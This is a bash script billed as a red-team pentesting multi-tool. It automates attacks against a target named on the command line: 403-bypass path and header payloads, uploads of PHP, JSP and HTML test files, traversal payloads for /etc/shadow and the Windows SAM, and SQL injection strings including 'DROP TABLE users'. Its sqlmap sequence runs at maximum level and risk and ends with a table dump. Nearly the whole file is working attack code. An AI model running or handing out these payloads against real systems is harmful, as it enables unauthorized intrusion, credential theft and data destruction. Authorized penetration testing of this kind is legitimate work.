#!/bin/bash


# ======= COLORS =======
RED="\033[1;31m"
GREEN="\033[1;32m"
CYAN="\033[1;96m"   #Cyan="\[\033[0;36m\]"
YELLOW="\033[1;33m"
MAGENTA="\033[1;35m"
WHITE="\e[1;97m"
NC="\033[0m" # No Color

SAVE_MODE=0
OUTPUT_DIR=""
DEBUG=1

debug() {
    if [[ "$DEBUG" -eq 1 ]]; then
        echo -e "${YELLOW}[DEBUG] $1${NC}"
    fi
}

banner() {
    echo -e "${CYAN}"
    echo "++----------------------------------------------------------------------------------++";
    echo "++----------------------------------------------------------------------------------++";
    echo "||                                                                                  ||";
    echo "||                                                                                  ||";
    echo "||   8888888888                888 888        888      d8b                   888    ||";
    echo "||   888                       888 888        888      Y8P                   888    ||";
    echo "||   888                       888 888        888                            888    ||";
    echo "||   8888888  8888b.  888  888 888 888888     888      888 88888b.   .d88b.  888    ||";
    echo "||   888          88b 888  888 888 888        888      888 888  88b d8P  Y8b 888    ||";
    echo "||   888     .d888888 888  888 888 888        888      888 888  888 88888888 Y8P    ||";
    echo "||   888     888  888 Y88b 888 888 Y88b.      888      888 888  888 Y8b.            ||";
    echo "||   888      Y888888   Y88888 888   Y888     88888888 888 888  888   Y8888  888    ||";
    echo "||                                                                                  ||";
    echo "||                                                                                  ||";
    echo "++----------------------------------------------------------------------------------++";
    echo "++----------------------------------------------------------------------------------++'${NC}'";
    echo -e "   ${WHITE}FaultLine: Red-Team Pentesting Suite\n${NC}"

    echo -e "      ${YELLOW}Offensive Security Multi-Tool\n${NC}"

    echo -e "        ${MAGENTA}------------------------------------------------------------
                Developer: Austin Tatham       Version: 1.0.0
            ------------------------------------------------------------${NC}
 "
}

usage() {
    echo -e "${GREEN}Usage:${NC} $0 -t <target> -m <mode> [-s <output_dir>]"
    exit 1
}

save_output() {
    local data="$1"
    local filename="$2"
    if [[ "$SAVE_MODE" -eq 1 ]]; then
        echo "$data" >> "$OUTPUT_DIR/$filename"
        echo -e "${GREEN}[+] Saved to $OUTPUT_DIR/$filename${NC}"
    fi
}


BYPASS_PAYLOADS=(
    "//admin//"
    "/admin?"
    "/admin/.."
    "/admin/%2e/"
    "/admin/%20"
    "/admin/.htaccess"
    "/admin/.json"
    "/admin.json"
    "/admin/;%2f..%2f..%2f"
    "/admin?id=1"
    "/admin~"
    "/admin/~"
    "/admin/..%3B/"
    "/admin/%3f/"
    "/admin/%09/"
    "/admin/%0a/"
    "/admin/%0d/"
)

BYPASS_HEADERS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Remote-IP: 127.0.0.1"
    "Referer: https://www.google.com"
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    "X-Custom-IP-Authorization: 127.0.0.1"
    "X-Forwarded-Host: localhost"
    "X-Host: localhost"
    "Forwarded: 127.0.0.1"
)

SQLI_PAYLOADS=(
    "' OR 1=1 --"
    "' OR '1'='1' --"
    "' UNION SELECT NULL, NULL, NULL --"
    "' OR SLEEP(5) --"
    "' UNION SELECT username, password FROM users --"
    "' OR 1=1#"
    "' UNION SELECT @@version, user() --"
    "'; DROP TABLE users; --"
    "' OR 1=1/*"
    "admin' OR '1'='1"
    "admin' OR '1'='1'--"
    "admin') OR ('1'='1"
    "admin') OR '1'='1"
    "admin\" OR \"1\"=\"1"
    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'"
)


crawl_html() {
    echo -e "${CYAN}[+] Crawling HTML for sensitive data: $TARGET${NC}"
    curl -s "https://$TARGET" | tee "$OUTPUT_DIR/full_html.txt"

    echo -e "${CYAN}[+] Extracting Comments...${NC}"
    grep '<!--' "$OUTPUT_DIR/full_html.txt" >> "$OUTPUT_DIR/comments.txt"

    echo -e "${CYAN}[+] Extracting Forms...${NC}"
    grep -oP '<form.*?</form>' "$OUTPUT_DIR/full_html.txt" >> "$OUTPUT_DIR/forms.txt"

    echo -e "${CYAN}[+] Searching for Hidden Inputs...${NC}"
    grep -oP '<input type="hidden".*?>' "$OUTPUT_DIR/full_html.txt" >> "$OUTPUT_DIR/hidden_inputs.txt"

    echo -e "${CYAN}[+] Extracting Metadata Tags...${NC}"
    grep -oP '<meta.*?>' "$OUTPUT_DIR/full_html.txt" >> "$OUTPUT_DIR/meta_tags.txt"

    echo -e "${CYAN}[+] Extracting JavaScript Files...${NC}"
    grep -oP 'src=".*?\.js"' "$OUTPUT_DIR/full_html.txt" | cut -d'"' -f2 >> "$OUTPUT_DIR/js_files.txt"

    echo -e "${CYAN}[+] Extracting Links...${NC}"
    grep -Eo '(http|https)://[a-zA-Z0-9./?=_-]*' "$OUTPUT_DIR/full_html.txt" | sort -u > "$OUTPUT_DIR/urls.txt"
    #grep -oP 'href' "$OUTPUT_DIR/full_html.txt"  >> "$OUTPUT_DIR/href_links.txt"

    echo -e "${GREEN}[+] HTML Crawler Complete.${NC}"
}

subdomain_enum() {
    echo -e "\n\e[94m[+] Enumerating Subdomains (subfinder + assetfinder + crt.sh)...\e[0m"
    subfinder -d "$TARGET" -silent > "$OUTPUT_DIR/subfinder.txt"
    assetfinder --subs-only "$TARGET" >> "$OUTPUT_DIR/subfinder.txt"
    curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> "$OUTPUT_DIR/subfinder.txt"
    sort -u "$OUTPUT_DIR/subfinder.txt" > "$OUTPUT_DIR/subdomains.txt"
}

detect_cms() {
    echo -e "${CYAN}[+] Detecting CMS...${NC}"
    response=$(curl -s "https://$TARGET")
    if echo "$response" | grep "wp-"; then
        echo -e "${GREEN}[+] WordPress detected.${NC}"
    elif echo "$response" | grep -iq "drupal"; then
        echo -e "${GREEN}[+] Drupal detected.${NC}"
    elif echo "$response" | grep -iq "joomla"; then
        echo -e "${GREEN}[+] Joomla detected.${NC}"
    else
        echo -e "${YELLOW}[-] No CMS detected.${NC}"
    fi
}

bypass_403() {
    echo "[+] Attempting 403 bypass on: $TARGET"
    for path in "${BYPASS_PAYLOADS[@]}"; do
        for header in "${BYPASS_HEADERS[@]}"; do
            response=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "https://$TARGET$path")
            if [[ "$response" == "200" ]]; then
                echo "[+] Bypass Successful: https://$TARGET$path using Header: $header"
                echo "$TARGET$path, Bypass, $header" >> "$OUTPUT_DIR/bypass_success.txt"
            fi
        done
    done
}

grab_screenshot() {
    echo -e "\n\e[94m[+] Taking Screenshots with GoWitness...\e[0m"
    gowitness scan single https://$TARGET --destination "$OUTPUT_DIR"
   # echo -e "\e[91m[-] GoWitness not found. Skipping screenshotting.\e[0m"
}

Port_Scanning() {
    echo -e "${RED}[+] IMPORTANT!${NC}"
    echo -e "${YELLOW}[+] About to begin ~Deep Crawl~ on $TARGET...5-10 min to complete ${NC}"
    echo "[*] Scanning ports..."
    nmap_results=$(sudo ./nmapAutomator.sh -H "$TARGET" -t Full)
    echo -e "${GREEN}[+] Nmap Results:${NC}\n$nmap_results"
    save_output "$nmap_results" "nmap_$TARGET.txt"
}

misconfigurations_fuzz(){
    echo -e "\n\e[94m[+] Checking for Open or Misconfigured Services (FTP/SMB/NFS)...\e[0m"
    nmap -v --script ftp-anon,ftp-bounce,smb-enum-shares,smb-enum-users,nfs-showmount -p 21,139,445,2049 "$TARGET" -oN "$OUTPUT_DIR/service_scripts.txt"
}

FinalRecon_call() {
    echo "[*] Running FinalRecon..."
    finalrecon_results=$(finalrecon --url "https://$TARGET" --dir -w /home/grep/custom_fuzz.txt)
    echo -e "${GREEN}[+] FinalRecon Results:${NC}\n$finalrecon_results"
    save_output "$finalrecon_results" "finalrecon_$TARGET.txt"
}

parse_js_files() {
    echo -e "${CYAN}[+] Extracting JavaScript endpoints.${NC}"
    js_files=$(curl -s "https://$TARGET" | grep -Eo 'src="[^"]+\.js"' | cut -d'"' -f2)
    for js in $js_files; do
        curl -s "$js" | grep -Eo 'http(s)?://[^"]+' >> "$OUTPUT_DIR/api_endpoints.txt"
    done
}


test_file_upload() {
    echo -e "${CYAN}[+] Testing for File Upload Vulnerabilities on: $TARGET${NC}"

    PAYLOAD_FILES=(
        "test.php"
        "test.jsp"
        "test.html"
        "test.jpg.php"
        "test.php5"
        "test.php;.jpg"
        "test.asp"
        "test.exe"
    )

    echo "<?php echo 'Vulnerable'; ?>" > "test.php"
    echo "<% out.println('Vulnerable'); %>" > "test.jsp"
    echo "<script>alert('XSS');</script>" > "test.html"
    echo "MZ" > "test.exe"  # Fake EXE file

    UPLOAD_ENDPOINTS=(
        "https://$TARGET/upload"
        "https://$TARGET/file-upload"
        "https://$TARGET/api/upload"
        "https://$TARGET/admin/upload"
        "https://$TARGET/media/upload"
        "https://$TARGET/files/upload"
    )

    UPLOAD_BYPASS_HEADERS=(
        "Content-Type: application/x-php"
        "Content-Disposition: attachment; filename=\"test.php\""
        "X-File-Name: test.php"
    )

    SUCCESSFUL_UPLOADS=()

    echo -e "[+] Scanning for vulnerable upload endpoints..."

    for endpoint in "${UPLOAD_ENDPOINTS[@]}"; do
        for file in "${PAYLOAD_FILES[@]}"; do
            for header in "${UPLOAD_BYPASS_HEADERS[@]}"; do
                response=$(curl -s -X POST -H "$header" -F "file=@$file" "$endpoint")

                if echo "$response" | grep -q -e "success" -e "uploaded" -e "http"; then
                    if [[ ! " ${SUCCESSFUL_UPLOADS[@]} " =~ " $endpoint " ]]; then
                        echo -e "${RED}[!] File upload vulnerability found at $endpoint${NC}"
                        SUCCESSFUL_UPLOADS+=("$endpoint")
                    fi

                    EXEC_PATHS=("$endpoint/$file" "https://$TARGET/uploads/$file" "https://$TARGET/media/$file")
                    for exec_path in "${EXEC_PATHS[@]}"; do
                        exec_response=$(curl -s "$exec_path")
                        if echo "$exec_response" | grep -q "Vulnerable"; then
                            echo -e "${GREEN}[+] Executable file uploaded successfully: $exec_path${NC}"
                        fi
                    done
                fi
            done
        done
    done

    echo -e "${GREEN}[+] File Upload Testing Complete.${NC}"

    rm -f test.php test.jsp test.html test.jpg.php test.php5 test.php\;.jpg test.asp test.exe
}

dns_brute() {
    echo -e "\n\e[94m[+] Brute-forcing DNS...\e[0m"
    dnsrecon -d "https://$TARGET" -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t brt > "$OUTPUT_DIR/dns_brute.txt"
}


fuzz_suite() {
    echo -e "\e[96m[+] Launching Full-Stack Fuzzing Suite...\e[0m"

    echo -e "\n\e[94m[+] Fuzzing GET parameters for injection points...\e[0m"
    ffuf -u "https://$TARGET?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 40 -mc all -fw 614 -of json -o "$OUTPUT_DIR/ffuf_params.json"

    echo -e "\n\e[94m[+] Running dirsearch...\e[0m"
    dirsearch -u "https://$TARGET" -e php,html,js,txt -w /usr/share/seclists/Discovery/Web-Content/common.txt -o "$OUTPUT_DIR/dirsearch.txt"

    echo -e "\n\e[94m[+] Scanning for vulnerable network services...\e[0m"
    nmap -v -p 161,500,1900,5353,111,2049 "$TARGET" -sV -oN "$OUTPUT_DIR/net_services.txt"
}


sql_injection_test() {
    echo -e "${CYAN}[+] Testing SQL injection vulnerabilities on: $TARGET${NC}"
    PAYLOADS=("' OR '1'='1" "' AND SLEEP(5)--")
    for PAYLOAD in "${PAYLOADS[@]}"; do
        RESPONSE=$(curl -s "https://$TARGET?id=$PAYLOAD")
        if [[ $RESPONSE =~ "error" || $RESPONSE =~ "syntax" ]]; then
            echo -e "${GREEN}[!] SQL Injection vulnerability detected: $PAYLOAD${NC}"
        fi
    done
}

test_directory_traversal() {
    echo -e "${CYAN}[+] Testing for Advanced Directory Traversal Vulnerabilities on: $TARGET${NC}"
    OUTPUT_FILE="$OUTPUT_DIR"

    PAYLOADS=(
        "../../../../etc/passwd"
        "../../../../etc/shadow"
        "../../../../etc/group"
        "../../../../etc/hosts"
        "../../../../etc/apache2/apache2.conf"
        "../../../../etc/nginx/nginx.conf"
        "../../../../etc/mysql/my.cnf"
        "../../../../proc/self/environ"
        "../../../../windows/win.ini"
        "../../../../windows/system32/drivers/etc/hosts"
        "../../../../windows/system32/config/sam"
        "../../../../windows/system32/config/system"
        "../../../../windows/system32/config/regback/system"
        "../../../../../../../../../../etc/passwd"
        ".././.././.././.././.././.././../etc/passwd"
        "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini"
        "../../../../../../../../../../../../../../../../etc/passwd"
        "../../../../../../../../../../../../../../../../windows/system32/config/sam"
        "../../../../etc/passwd%00"
        "../../../../etc/shadow%00"
        "../../../../../../../../../../etc/passwd%00"
        "../../../../../../../../../../windows/system32/config/sam%00"
        "../../../../etc/passwd%2500"
        "../../../../etc/shadow%2500"
        "../..%2f../..%2f../..%2f../..%2f../..%2f../..%2fetc/passwd"
        "../../../../../..%252f..%252f..%252f..%252fetc/passwd"
        "../../../../../..%c0%afetc/passwd"
        "..%%35%63/etc/passwd"
        "../../../../../../../../conf/server.xml"
        "/../../../../../../../../../../../etc/passwd%00.html"
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae//etc/passwd"
        "%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63/etc/passwd"
    )

    REQUEST_METHODS=("GET" "POST" "HEAD")

    USER_AGENTS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        "Googlebot/2.1 (+http://www.google.com/bot.html)"
        "Mozilla/5.0 (Linux; Android 10)"
    )

    HEADERS=(
        "X-Originating-IP: 127.0.0.1"
        "X-Forwarded-For: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "Referer: https://www.google.com"
        "X-Custom-IP-Authorization: 127.0.0.1"
        "X-Forwarded-Host: localhost"
        "X-Host: localhost"
        "Forwarded: 127.0.0.1"
    )

   SUCCESSFUL_TRAVERSAL=()

    echo -e "[+] Scanning for directory traversal vulnerabilities..."

    for method in "${REQUEST_METHODS[@]}"; do
        for user_agent in "${USER_AGENTS[@]}"; do
            for header in "${HEADERS[@]}"; do
                for payload in "${PAYLOADS[@]}"; do
                    response=$(curl -s -X "$method" -H "User-Agent: $user_agent" -H "$header" "https://$TARGET/$payload")

                    if echo "$response" | grep -q -e "root:x" -e "127.0.0.1" -e "windows registry" -e "root:x:0" -e "[boot loader]" -e "mysql_user" -e "apache2.conf" -e "nginx.conf"; then
                        if [[ ! " ${SUCCESSFUL_TRAVERSAL[@]} " =~ " $TARGET/$payload " ]]; then
                            echo -e "${RED}[!] Directory Traversal Vulnerability Found at: $TARGET${NC}"
                            SUCCESSFUL_TRAVERSAL+=("https://$TARGET/$payload")
                            echo "$TARGET, Traversal, $payload" >> "$OUTPUT_FILE/upvulns.txt"
                        fi
                    fi
                done
            done
        done
    done

    echo -e "${GREEN}[+] Directory Traversal Testing Complete. Results saved in $OUTPUT_FILE${NC}"
}


test_sqli() {
    echo "[+] Testing SQL Injection on $TARGET"
    for payload in "${SQLI_PAYLOADS[@]}"; do
        response=$(curl -s "https://$TARGET/login?user=$payload")
        if echo "$response" | grep -q -e "error" -e "admin"; then
            echo "[!] SQLi Found: https://$TARGET/login?user=$payload"
            echo "$TARGET, SQLi, $payload" >> "$OUTPUT_DIR/sqli_vulns.txt"
        fi
    done
}

#temp_sqlmap() {
#    echo -e "Start of Testing of SQLmap"
#    dirtyresponse=$(sqlmap -u "https://$TARGET" --delay=2 --batch --level=5 --risk=3 --crawl=3 --fingerprint --random-agent -o "$OUTPUT_DIR/sqlmap.txt")
#}
temp_sqlmap() {
    echo -e "\n[+] Starting SQL Injection Recon on https://$TARGET"

    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    SQLMAP_BASE="$OUTPUT_DIR/sqlmap_$TIMESTAMP"
    mkdir -p "$SQLMAP_BASE"
    LOGFILE="$SQLMAP_BASE/full_report.log"
    URL="https://$TARGET"

    echo -e "\n[*] Phase 1: Fingerprinting & Crawling" | tee -a "$LOGFILE"
    sqlmap -u "$URL" --batch --level=5 --risk=3 --crawl=3 --random-agent --technique=BEUSTQ \
        --threads=4 --delay=1 --timeout=15 --retries=2 --output-dir="$SQLMAP_BASE" \
        --flush-session --answers="follow=Y" --smart \
        --fingerprint \
        | tee -a "$LOGFILE"

    echo -e "\n[*] Phase 2: Parameter Discovery & Testing" | tee -a "$LOGFILE"
    sqlmap -u "$URL" --batch --level=5 --risk=3 --random-agent --technique=BEUSTQ \
        --forms --crawl=3 --crawl-exclude="logout" \
        --threads=5 --delay=1 \
        --output-dir="$SQLMAP_BASE" \
        --flush-session \
        --identify-waf \
        | tee -a "$LOGFILE"

    echo -e "\n[*] Phase 3: Database Enumeration" | tee -a "$LOGFILE"
    sqlmap -u "$URL" --batch --random-agent --technique=BEUSTQ \
        --threads=3 --delay=1 \
        --output-dir="$SQLMAP_BASE" \
        --dbs | tee -a "$LOGFILE"

    echo -e "\n[*] Phase 4: Table & Column Enumeration (If DB found)" | tee -a "$LOGFILE"
    # This can be looped through discovered DBs
    sqlmap -u "$URL" --batch --random-agent --technique=BEUSTQ \
        --output-dir="$SQLMAP_BASE" \
        -D TARGET_DB --tables | tee -a "$LOGFILE"

    sqlmap -u "$URL" --batch --random-agent --technique=BEUSTQ \
        --output-dir="$SQLMAP_BASE" \
        -D TARGET_DB -T TARGET_TABLE --columns | tee -a "$LOGFILE"

    echo -e "\n[*] Phase 5: Optional Data Dump (Caution!)" | tee -a "$LOGFILE"
    sqlmap -u "$URL" --crawl=2 --batch --random-agent --technique=BEUSTQ \
        --output-dir="$SQLMAP_BASE" \
        -D TARGET_DB -T TARGET_TABLE -C COLUMN1,COLUMN2 --dump | tee -a "$LOGFILE"

    echo -e "\n[+] SQLmap Testing Completed! Logs saved in $SQLMAP_BASE"
    }


detect_waf() {
    echo -e "${CYAN}[+] Detecting WAF...${NC}"
    payload="' AND 1=1 --"
    response=$(curl -s -d "param=$payload" "https://$TARGET" -o /dev/null -w "%{http_code}")
    if [[ $response == "403" || $response == "406" ]]; then
        echo -e "${RED}[!] WAF detected: Response code $response.${NC}"
    else
        echo -e "${GREEN}[+] No WAF detected.${NC}"
    fi
}

test_http_methods() {
    echo -e "${CYAN}[+] Testing HTTP Methods...${NC}"
    methods=("GET" "POST" "PUT" "DELETE" "OPTIONS" "HEAD" "TRACE")
    for method in "${methods[@]}"; do
        response=$(curl -s -X "$method" "https://$TARGET" -w "%{http_code}")
        echo -e "${YELLOW}[*] $method returned status code: $response${NC}"
        if [[ $method == "TRACE" && $response == "200" ]]; then
            echo -e "${RED}[!] TRACE method enabled. Possible XST vulnerability!${NC}"
        fi
    done
}


main() {
    banner
    case "$MODE" in
        recon)
            crawl_html
            detect_cms
            subdomain_enum
            parse_js_files
            grab_screenshot
            fuzz_suite
            misconfigurations_fuzz
            Port_Scanning
            detect_waf
            FinalRecon_call
            ;;
        exploit)
            Port_Scanning
            parse_js_files
            test_http_methods
            subdomain_enum
            grab_screenshot
            dns_brute
            fuzz_suite
            detect_waf
            misconfigurations_fuzz
            test_file_upload
            test_directory_traversal
            bypass_403
            sql_injection_test
            ;;
        all)
            crawl_html
            detect_cms
            parse_js_files
            #dns_brute
            subdomain_enum
            test_http_methods
            grab_screenshot
            detect_waf
            fuzz_suite
            misconfigurations_fuzz
            FinalRecon_call
            test_file_upload
            #test_directory_traversal
            bypass_403
            Port_Scanning
            sql_injection_test
            temp_sqlmap
            ;;
    esac
    echo -e "${GREEN}[+] FaultLine execution completed.${NC}"

}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -t) TARGET="$2"; shift ;;
        -m) MODE="$2"; shift ;;
        -jwt) JWT_TOKEN="$2"; shift ;;  # Accepting JWT for token testing
        -s) SAVE_MODE=1; OUTPUT_DIR="$2"; mkdir -p "$OUTPUT_DIR"; shift ;;
        *) usage ;;
    esac
    shift
done

main
